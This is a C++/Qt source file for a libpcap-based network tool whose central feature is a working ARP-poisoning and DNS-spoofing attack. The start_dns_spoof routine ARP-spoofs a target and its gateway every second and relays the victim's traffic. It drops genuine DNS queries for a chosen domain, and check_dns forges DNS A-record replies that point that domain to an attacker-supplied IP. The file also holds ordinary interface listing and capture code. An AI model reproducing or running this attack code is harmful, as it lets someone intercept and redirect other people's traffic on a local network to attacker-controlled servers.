#include "lowlevelnetworkmanager.h"
#include "network_headers.h"
#include <QtTypes>
#include <QTimer>

void detect_my_mac(u_char* user, const QMap<QString, QString>& packet_state, const u_char* packet, int len){
    Receiver* recv = (Receiver*)user;
    if(!recv->variables.contains("MY_MAC")){
        recv->variables["MY_MAC"] = packet_state["Source_Mac"];
        qDebug()<<"detectec your mac address: "<<recv->variables["MY_MAC"];
    }
    recv->del_packet_event("Detect_My_Mac");
}
void update_mac_table(u_char* user, const QMap<QString, QString>& packet_state, const u_char* packet, int len){
    Receiver* recv = (Receiver*)user;
    if(!recv->mac_table.contains(packet_state["Source_IP"])){
        qDebug()<<"updated mac table - ip: "<<packet_state["Source_IP"]<<" mac: "<<packet_state["Source_Mac"];
        recv->mac_table[packet_state["Source_IP"]] = packet_state["Source_Mac"];
    }
}
void detect_ping(u_char* user, const QMap<QString, QString>& packet_state, const u_char* packet, int len){
    //qDebug()<<"ping detect type: "<<packet_state["ICMP_Type"]<<" source ip: "<<packet_state["Source_IP"]<<" target ip: "<<packet_state["Target_IP"];
}
void packet_relay(u_char* user, const QMap<QString, QString>& packet_state, const u_char* packet, int len){
    Receiver* recv = (Receiver*)user;
    LowLevelNetworkManager* llnm = (LowLevelNetworkManager*)(recv->llnm);
    if(packet_state["Target_IP"] == recv->variables["MY_IP"]) return;

    QString target;
    if(recv->mac_table.contains(packet_state["Target_IP"]))
        target = packet_state["Target_IP"];
    else
        target = llnm->gateway_ip;

    QString target_mac = recv->mac_table[target];
    quint8 dst[6];
    recv->str_to_mac_addr(dst, target_mac);
    Ethernet* ethe = (Ethernet*)(packet);
    if(ethe->get_type() == "IPv4"){
        Ip4Pkt* ip = (Ip4Pkt*)(ethe->get_body());
        if(ip->get_protocol() == "UDP"){
            Udp* udp = (Udp*)(ip->get_body());
            if(udp->get_destination() == 53){
                Dns* dns = (Dns*)(udp->get_body());
                auto query = dns->parse_query(dns->get_body());
                if(query.name.contains(llnm->target_domain)){
                    qDebug()<<"filtered dns query";
                    return;
                }
            }
        }
    }
    ethe->set_dst(dst);

    qDebug()<<"relay - dst: "<<ethe->get_dst()<<" src: "<<ethe->get_src();
    llnm->send->send_packet((u_char*)packet, len);
}
void check_dns(u_char* user, const QMap<QString, QString>& packet_state, const u_char* packet, int len){
    Receiver* recv = (Receiver*)user;
    LowLevelNetworkManager* llnm = (LowLevelNetworkManager*)(recv->llnm);
    quint8 reply[1514];

    for(int i=0; i<len; i++){
        reply[i] = packet[i];
    }

    Ethernet* ethe = (Ethernet*)reply;
    Ip4Pkt* ip = (Ip4Pkt*)(ethe->get_body());
    Udp* udp = (Udp*)(ip->get_body());
    Dns* dns = (Dns*)(udp->get_body());
    DnsQuery query = dns->parse_query(dns->get_body());
    if(query.get_class() != dns_class_in || query.get_type() != dns_type_a)
        return;
    else if(query.name.contains(llnm->target_domain)){
        qDebug()<<query.name;
        //Dns Answer 생성
        quint8 fake_ip[4];
        recv->str_to_ip_addr(fake_ip, llnm->fake_ip);
        int len = ip->get_total_length() + 14;
        quint8* ptr = (reply + len);
        *(quint16*)ptr = htons(0xc00c);
        *(quint16*)(ptr + 2) = htons(dns_type_a);
        *(quint16*)(ptr + 4) = htons(dns_class_in);
        *(quint32*)(ptr + 6) = htonl(0xE100);
        *(quint16*)(ptr + 10) = htons(4);
        ptr+=12;
        for(int i=0; i<4; i++)
            *(ptr++) = fake_ip[i];
        *(quint16*)(dns->answers) = htons(1);

        //Udp 헤더 변경
        len += 16;
        quint16 udp_len = len - 14 - ip->get_header_len();
        quint16 sport = udp->get_source();
        quint16 dport = udp->get_destination();
        udp->set_destination(sport);
        udp->set_source(dport);
        udp->set_length(udp_len);

        //IP 헤더 변경
        quint8 temp[4];
        for(int i=0; i<4; i++){
            temp[i] = ip->source[i];
            ip->source[i] = ip->destination[i];
        }
        for(int i=0; i<4; i++)
            ip->destination[i] = temp[i];
        *(quint16*)(ip->identification) = htons(0x1204);
        ip->set_total_length(udp_len + ip->get_header_len());

        //체크섬 다시 구하기
        udp->set_checksum(udp->cal_checksum(ip->source, ip->destination, udp_len));
        ip->set_checksum(ip->cal_checksum());

        quint8 temp_mac[6];
        for(int i=0; i<6; i++){
            temp_mac[i] = ethe->source[i];
            ethe->source[i] = ethe->destination[i];
        }
        for(int i=0; i<6; i++)
            ethe->destination[i] = temp_mac[i];

        qDebug()<<"send dns packet";
        llnm->send->send_packet(reply, len);
    }
}

bool LowLevelNetworkManager::start_dns_spoof(const QString& target_ip, const QString& gateway_ip, const QString& domain, const QString& fake_ip){
    QString tip = target_ip;
    if(recv->variables.contains(tip))
        tip = recv->variables[tip];
    QString fip = fake_ip;
    if(recv->variables.contains(fip))
        fip = recv->variables[fip];
    QString gip = gateway_ip;
    if(recv->variables.contains(gip))
        gip = recv->variables[gip];

    this->target_ip = tip;
    this->gateway_ip = gip;

    PacketEvent relay_packet1;
    relay_packet1.check_list["Source_IP"] = tip;
    relay_packet1.check_list["Target_Mac"] = recv->variables["MY_MAC"];
    relay_packet1.routine = packet_relay;

    PacketEvent dns_check;
    dns_check.check_list["Source_IP"] = tip;
    qDebug()<<tip;
    dns_check.check_list["Application_Protocol"] = "DNS";
    dns_check.check_list["DNS_Type"] = "DNS Query";
    dns_check.routine = check_dns;
    recv->add_packet_event("Packet_Relay1", relay_packet1);
    recv->add_packet_event("Dns_Check", dns_check);

    dns_spoof_timer = new QTimer(this);
    QObject::connect(dns_spoof_timer, &QTimer::timeout, [this](){
        arp_spoof(this->target_ip, this->gateway_ip, "MY_MAC");
    });
    dns_spoof_timer->start(1000);
    target_domain = domain;
    this->fake_ip = fip;
    return true;
}

bool LowLevelNetworkManager::stop_dns_spoof(){return true;}

QString LowLevelNetworkManager::address_to_string(struct sockaddr * addr){
    char buf[100];
    if(addr->sa_family == AF_INET){
        struct sockaddr_in * inaddr = (struct sockaddr_in *)addr;
        inet_ntop(addr->sa_family, &inaddr->sin_addr.S_un, buf, 100);
    }
    else if(addr->sa_family == AF_INET6){
        struct sockaddr_in6 * in6addr = (struct sockaddr_in6 *)addr;
        inet_ntop(addr->sa_family, &in6addr->sin6_addr.u, buf, 100);
    }
    else if(addr->sa_family == AF_LINK){
        struct sockaddr_dl * dladdr = (struct sockaddr_dl *)addr;
        inet_ntop(addr->sa_family, dladdr->sdl_data, buf, 100);
    }
    else if(addr->sa_family == 0)
        return "Undefined";
    else
        return "Unknown";

    return QString(buf);
}

QString LowLevelNetworkManager::protocol_type(struct sockaddr* addr){
    auto proto = addr->sa_family;
    QString prototype;

    if(proto == AF_INET) prototype = "IPv4";
    else if(proto == AF_INET6) prototype = "IPv6";
    else if(proto == AF_LINK) prototype = "MAC";
    else if(proto == 0) return "Undefined";
    else prototype = "Unknown";

    return prototype + "(" + QString::number(proto) + ")";
}

void LowLevelNetworkManager::get_interfaces(){
    if(devs != nullptr){
        pcap_freealldevs(devs);
        devs = nullptr;
    }

    if(pcap_findalldevs(&devs, err_buf) == -1){
        message("pcap_findAlldevs error");
        emit error("can't find network interfaces (please check get_interfaces method)");
    }

    for(auto dev = devs; dev != NULL; dev = dev->next){
        QString name = dev->name;
        QString description = dev->description;
        QString detail = "--------------------------------------------------------\n";
        for(auto addr = dev->addresses; addr != NULL; addr = addr->next){
            if(addr->addr) detail += ("Address\t" + protocol_type(addr->addr) + "\t" + address_to_string(addr->addr) + "\n");
            if(addr->broadaddr) detail += ("Broadcast\t" + protocol_type(addr->broadaddr) + "\t" + address_to_string(addr->broadaddr) + "\n");
            if(addr->dstaddr) detail += ("Destination\t" + protocol_type(addr->dstaddr) + "\t" + address_to_string(addr->dstaddr) + "\n");
            if(addr->netmask) detail += ("Netmask\t" + protocol_type(addr->netmask) + "\t" + address_to_string(addr->netmask) + "\n");
            detail += "--------------------------------------------------------\n";
        }

        emit interfaceSearch(name, description, detail);
    }
}

void LowLevelNetworkManager::connect_interface(int idx){
    auto dev = devs;
    while(dev != NULL){
        if(idx == 0) break;
        dev = dev->next;
        idx--;
    }
    device = pcap_open_live(dev->name, (1<<16), 1, 1000, buf);
    if(device == NULL){
        message("pcap_open_live error");
        emit error("can't open network interface (please check connect_interface)");
    }else{
        QThread * thread = new QThread(this);
        recv = new Receiver(device, this);
        recv->moveToThread(thread);

        for(auto addr = dev->addresses; addr != NULL; addr = addr->next){
            if(addr->addr->sa_family == AF_INET)
                recv->variables["MY_IP"] = address_to_string(addr->addr);
            else if(addr->addr->sa_family == AF_INET6)
                recv->variables["MY_IP6"] = address_to_string(addr->addr);
        }

        PacketEvent my_mac_detect;
        my_mac_detect.check_list["Source_IP"] = recv->variables["MY_IP"];
        my_mac_detect.routine = detect_my_mac;
        recv->add_packet_event("Detect_My_Mac", my_mac_detect);

        PacketEvent mac_table_update;
        mac_table_update.check_list["Network_Protocol"] = "ARP";
        mac_table_update.routine = update_mac_table;
        recv->add_packet_event("Update_Mac_Table", mac_table_update);

        PacketEvent ping_detect;
        ping_detect.check_list["IPv4_Type"] = "ICMP";
        ping_detect.routine = detect_ping;
        recv->add_packet_event("Detect_Ping", ping_detect);

        QObject::connect(thread, &QThread::started, recv, &Receiver::start);
        thread->start();

        send = new Sender(device, recv);
        QObject::connect(send, &Sender::error, this, [this](const QString& msg){emit error("Sender: " + msg);});
        emit connectSuccess();
    }
}

void LowLevelNetworkManager::reqCap(){
    if(cap != nullptr) return;

    qDebug()<<"capture start";
    cap = new Capture(recv);
    cap->start();
    QObject::connect(cap, &Capture::captured, this, &LowLevelNetworkManager::onCaptured);
}

QString LowLevelNetworkManager::show_mac_table(){
    QString table;

    for(QMap<QString, QString>::Iterator iter = recv->mac_table.begin(); iter != recv->mac_table.end(); iter++){
        table += (iter.key() + " : " + iter.value() + "\n");
    }
    return table;
}

QString LowLevelNetworkManager::show_variables(){
    QString table;

    for(QMap<QString, QString>::Iterator iter = recv->variables.begin(); iter != recv->variables.end(); iter++){
        table += (iter.key() + " : " + iter.value() + "\n");
    }
    return table;
}
